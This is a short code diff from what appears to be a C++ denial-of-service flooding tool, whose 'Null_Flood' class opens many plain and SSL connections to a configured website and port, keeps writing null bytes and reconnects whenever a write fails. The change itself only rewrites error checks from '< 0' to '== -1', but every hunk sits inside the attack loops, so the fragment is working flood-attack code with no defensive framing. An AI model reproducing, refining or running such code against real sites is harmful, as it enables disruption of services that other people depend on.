@@ -21,10 +21,10 @@ int Null_Flood::make_socket(const char *host, const char *port) {
         exit(EXIT_FAILURE);
     }
     for(p = servinfo; p != nullptr; p = p->ai_next) {
-        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) < 0) {
+        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
             continue;
         }
-        if(connect(sock, p->ai_addr, p->ai_addrlen) < 0) {
+        if(connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
             close(sock);
             continue;
         }
@@ -58,7 +58,7 @@ void Null_Flood::attack(const int *id) {
             if(!sockets[x]){
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
             }
-            if((r = write_socket(sockets[x],"\0", 1)) < 0){
+            if((r = write_socket(sockets[x],"\0", 1)) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
             }else{
@@ -97,7 +97,7 @@ void Null_Flood::attack_ssl(const int *id) {
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
-            if((r = write_socket(SSLs[x], "\0", 1)) < 0){
+            if((r = write_socket(SSLs[x], "\0", 1)) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                 CTXs[x] = InitCTX();
